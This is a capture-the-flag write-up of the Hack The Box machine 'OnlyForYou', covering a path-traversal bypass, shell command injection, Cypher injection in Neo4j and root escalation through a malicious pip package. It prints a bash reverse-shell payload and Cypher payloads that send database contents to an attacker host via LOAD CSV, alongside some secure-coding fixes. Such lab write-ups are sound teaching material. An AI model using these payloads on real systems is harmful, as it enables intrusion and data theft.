# :globe_with_meridians: OnlyForYou HTB | LFR | RCE | Cypher Injection (Neo4j) graph database | pip3 download code execution

> **Original Source:** [OnlyForYou HTB | LFR | RCE | Cypher Injection (Neo4j) graph database | pip3 download code execution](https://infosecwriteups.com/onlyforyou-htb-lfr-rce-cypher-injection-neo4j-graph-database-pip3-download-code-execution-7855193b3d5c)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# OnlyForYou HTB | LFR | RCE | Cypher Injection (Neo4j) graph database | pip3 download code execution


*only4you — 09/05/2023*


Here’s a summary of the key points of Only4you HTB machine:


Difficulty Level: Medium!!!!!!!!


Vulnerabilities:


- LFR (Local File Read): The presence of a Local File Read vulnerability suggests that an attacker can read files on the system, potentially accessing sensitive information.

- RCE (Remote Code Execution): RCE vulnerability implies that an attacker can execute arbitrary code on the target system, which can lead to complete control of the system.

- Cypher Injection (Neo4j): Cypher injection is a vulnerability in Neo4j’s query language that allows attackers to manipulate graph database queries, potentially gaining unauthorized access or exfiltrating data.

- Pip Download Code Execution: This vulnerability likely involves exploiting the Python package manager, Pip, to download and execute malicious code, potentially leading to further compromise of the system.


let’s add only4you.htb to our hosts file:

*hosts*Enumeration

>

nmap -sCV -Pn -p- — min-rate=1000 10.10.11.210


Two ports are open: 80,22. let’s browse port 80:


*web technologies*


let’s scan for additional subdomains:


*ffuf*


We can use the `-fs` flag to filter out HTTP responses based on their size. Specifically, we’re filtering responses that have a size of 178 bytes to limit false positives. The `-mc` flag allows us to match specific HTTP status codes. By default, it matches status codes 200, 204, 301, 302, 307, 401, 403, 405, and 500.


Let’s add this subdomain to our hosts file:


At first glance, it seems that it has the vulnerability of uploading a malicious file, but it is not vulnerable.


we can download the source code.


As I mentioned, the app is not vulnerable to malicious file uploads.


- The code restricts uploaded file types to `.jpg` and `.png.`

- It uses `secure_filename` to mitigate directory traversal attacks.

- Consider implementing file size validation to prevent large files from being uploaded.


Look at the following code snippet:


```
@app.route('/download', methods=['POST'])
def download():
image = request.form['image']
filename = posixpath.normpath(image)
if '..' in filename or filename.startswith('../'):
flash('Hacking detected!', 'danger')
return redirect('/list')
if not os.path.isabs(filename):
filename = os.path.join(app.config['LIST_FOLDER'], filename)
try:
if not os.path.isfile(filename):
flash('Image doesn\'t exist!', 'danger')
return redirect('/list')
except (TypeError, ValueError):
raise BadRequest()
return send_file(filename, as_attachment=True)
```


There is a basic prevention measure against Local File Read (LFR) vulnerabilities in the `app.py` code. Specifically, the code checks whether the submitted `filename` starts with ".." or "../" and takes action to prevent directory traversal attacks. in the above code `posixpath.normpath(image)` is used to normalize the path to prevent any tricks or manipulations with slashes in the filename.`if '..' in filename or filename.startswith('../')` checks whether the `filename` contains ".." or starts with "../." If it does, it flashes a warning message and redirects to the `/list` page, effectively preventing access to parent directories. This can be bypassed by starting the file name with `/` and reading any local files:


We can read the main configuration file for Nginx:


We can read the server block configuration file used to define settings for a default virtual host in Nginx:


let’s read the app.py:


It’s using `sendmessage` function from `form.py.`


## Get Aydin Naserifard’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


lets read form.py


It appears to have a potential command injection vulnerability in the `issecure` function, specifically in the following line:


```
result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```


In this line, the `domain` variable is constructed from user-provided input (`email`) without proper validation or sanitation.

>

Note: To fix this vulnerability and prevent command injection, we should avoid constructing shell commands using user-provided input directly. Instead, consider using safer alternatives like Python’s `subprocess` module with the `subprocess.run` function to pass arguments as a list. Here's a safer way to execute the `dig` command:


```
result = run(["dig", "txt", domain], stdout=PIPE)
```


back to the contact page and try to get a reverse shell:


>

our payload: bash -i >& /dev/tcp/10.10.14.74/4444 0>&1


*shell*


*unamepermission denied*

>

let’s use ss -tulwn. We are aiming to determine which ports are open and in a listening state for the purpose of port forwarding. check for open ports on the system, and we’ve identified that there are two services running on ports 8001, 3000.


let’s do a port forward using chisel:


With default credentials, `admin:admin` we can login


As you can see, there is a task about migrating database to `neo4j` which is a graph database.


## Cypher Injection (neo4j)


>

Cypher is a query language specifically designed for querying graph databases, and it is primarily associated with Neo4j, a popular graph database system. Cypher allows you to interact with and retrieve data from a graph database by specifying patterns and relationships within the data graph. It is a declarative query language, meaning you describe what you want to retrieve, and the database engine figures out how to do it.


to get version, name and edition of neo4j database:


```
' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.92/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```


*version*


To list the labels from neo4j database:


```
' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.191:8000/?'+label AS b RETURN b//
```


This query will give us 2 labels or tables in response which is `user` and `employee. `Now we need to extract the property or the value from user label:


```
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.191:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```


these are sha-256 hashes of john and admin users. let’s try to crack them using john:


user flagRoot Privilege Escalation:


- john can run the `pip3` command as the root user

- The command itself downloads a package (`*.tar.gz`) from a URL (`http://127.0.0.1:3000`) using `pip3`. This command is allowed without password authentication.


let’s do a port forward on port 3000 and browse web app:


From `Explore` we see two users, admin and john, we can use john's creds to login:


## Pip Download Code Execution:


Pip is a package management system written in Python. It can download custom Python package so we can create a malicious package to execute arbitrary code by following this article:

*[Create Malicious Python Package](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/#1.-create-malicious-python-package)*


to package the project, run the following command in the project root.


It generates `.tar.gz` file in `dist` folder.


After building the pip package, upload it to the `Test` repo


Go to the settings and make sure to make the repo public.


Now run the following pip3 command to download the pip package with sudo:


```
sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/exploitpy-0.0.1.tar.gz
```


Now we are root.


---

*Originally published on [Medium](https://infosecwriteups.com/onlyforyou-htb-lfr-rce-cypher-injection-neo4j-graph-database-pip3-download-code-execution-7855193b3d5c). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
